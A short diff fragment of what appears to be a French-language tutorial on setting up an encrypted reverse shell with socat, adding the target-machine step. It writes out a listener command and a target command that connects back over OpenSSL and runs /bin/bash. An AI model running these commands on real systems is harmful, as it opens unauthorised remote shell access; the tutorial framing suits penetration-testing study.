@@ -111,4 +111,9 @@ user@ip: ~$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
 
 **verify=0** indique qu'on ne veut **pas valider** que notre certificat a été signé par une **autorité reconnue**.
 
-#### 4è-
+#### 4- Connection -- Machine cible
+
+```shell
+user@raspberrypi: ~$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+```
+
